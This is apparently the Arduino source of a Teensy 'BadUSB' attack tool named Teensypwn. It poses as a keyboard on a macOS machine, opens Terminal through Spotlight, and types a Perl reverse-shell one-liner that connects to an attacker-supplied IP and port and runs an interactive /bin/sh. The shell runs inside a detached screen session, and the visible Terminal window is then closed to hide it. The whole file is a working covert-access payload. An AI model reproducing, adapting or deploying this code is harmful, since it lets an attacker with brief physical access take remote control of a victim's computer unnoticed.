/* 
  Teensypwn 2015 C. Papathanasiou.
  Based on USB Driveby by S. Kamkar
         Works on MacOSX 
*/


int ds = 500;

#if defined(CORE_TEENSY)
#define LED_PIN 11
#else
#define LED_PIN 13
#endif

void setup()
{
  // give us a little time to connect up
  delay(1000);
  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);
  // turn the LED on while we're pwning
  digitalWrite(LED_PIN, HIGH);
  // now open Terminal
  openapp("Terminal");
  cmd(KEY_N);
  //typeln("printf '\\e[2t'");
  typeln("screen");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  typeln("perl -e 'use Socket;$i=\"IP-here\";$p=Port-here;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'");
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.set_key1(KEY_A);
  Keyboard.set_key4(KEY_D);
  Keyboard.send_now();
  typeln("exit");
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.set_key1(KEY_Q);
  Keyboard.send_now();
  delay(ds);
}

void typeln(String chars)
{
  Keyboard.print(chars);
  delay(ds);
  Keyboard.println("");
  delay(ds * 4);
}

void openapp(String app)
{
  // open spotlight (or alfred/qs), then the app
  cmd(KEY_SPACE);
  typeln(app);
}

void k(int key)
{
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds/2);

  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds/2);
}


void mod(int mod, int key)
{
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds);
}

void ctrl(int key)
{
  mod(MODIFIERKEY_CTRL, key);
}

void cmd(int key)
{
  mod(MODIFIERKEY_GUI, key);
}

void shift(int key)
{
  mod(MODIFIERKEY_SHIFT, key);
}

void loop()
{
  // blink quickly so we know we're done
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}


  



